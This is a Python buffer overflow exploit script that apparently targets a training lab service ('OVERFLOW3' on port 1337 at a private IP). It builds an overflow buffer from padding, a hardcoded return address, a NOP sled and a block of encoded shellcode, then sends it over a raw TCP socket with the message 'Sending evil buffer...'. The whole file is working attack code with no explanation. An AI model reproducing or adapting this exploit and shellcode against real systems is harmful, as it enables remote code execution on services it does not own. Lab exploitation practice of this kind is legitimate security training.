import socket

ip = "10.10.116.56"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
#offset 0BADF00D
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
# \x00\x11\x40\x5f\xb8\xee
#offset 0BADF00D
payload = "\xfc\xbb\x27\x95\x1b\x5d\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xdb\x7d\x99\x5d\x23\x7e\xfe\xd4\xc6\x4f\x3e\x82\x83\xe0\x8e\xc0\xc1\x0c\x64\x84\xf1\x87\x08\x01\xf6\x20\xa6\x77\x39\xb0\x9b\x44\x58\x32\xe6\x98\xba\x0b\x29\xed\xbb\x4c\x54\x1c\xe9\x05\x12\xb3\x1d\x21\x6e\x08\x96\x79\x7e\x08\x4b\xc9\x81\x39\xda\x41\xd8\x99\xdd\x86\x50\x90\xc5\xcb\x5d\x6a\x7e\x3f\x29\x6d\x56\x71\xd2\xc2\x97\xbd\x21\x1a\xd0\x7a\xda\x69\x28\x79\x67\x6a\xef\x03\xb3\xff\xeb\xa4\x30\xa7\xd7\x55\x94\x3e\x9c\x5a\x51\x34\xfa\x7e\x64\x99\x71\x7a\xed\x1c\x55\x0a\xb5\x3a\x71\x56\x6d\x22\x20\x32\xc0\x5b\x32\x9d\xbd\xf9\x39\x30\xa9\x73\x60\x5d\x1e\xbe\x9a\x9d\x08\xc9\xe9\xaf\x97\x61\x65\x9c\x50\xac\x72\xe3\x4a\x08\xec\x1a\x75\x69\x25\xd9\x21\x39\x5d\xc8\x49\xd2\x9d\xf5\x9f\x75\xcd\x59\x70\x36\xbd\x19\x20\xde\xd7\x95\x1f\xfe\xd8\x7f\x08\x95\x23\xe8\x3d\x61\x07\xd6\x29\x77\x57\x37\xf6\xfe\xb1\x5d\x16\x57\x6a\xca\x8f\xf2\xe0\x6b\x4f\x29\x8d\xac\xdb\xde\x72\x62\x2c\xaa\x60\x13\xdc\xe1\xda\xb2\xe3\xdf\x72\x58\x71\x84\x82\x17\x6a\x13\xd5\x70\x5c\x6a\xb3\x6c\xc7\xc4\xa1\x6c\x91\x2f\x61\xab\x62\xb1\x68\x3e\xde\x95\x7a\x86\xdf\x91\x2e\x56\xb6\x4f\x98\x10\x60\x3e\x72\xcb\xdf\xe8\x12\x8a\x13\x2b\x64\x93\x79\xdd\x88\x22\xd4\x98\xb7\x8b\xb0\x2c\xc0\xf1\x20\xd2\x1b\xb2\x41\x31\x89\xcf\xe9\xec\x58\x72\x74\x0f\xb7\xb1\x81\x8c\x3d\x4a\x76\x8c\x34\x4f\x32\x0a\xa5\x3d\x2b\xff\xc9\x92\x4c\x2a\xc9\x14\xb3\xd5"
postfix = ""

buffer = prefix + overflow +retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")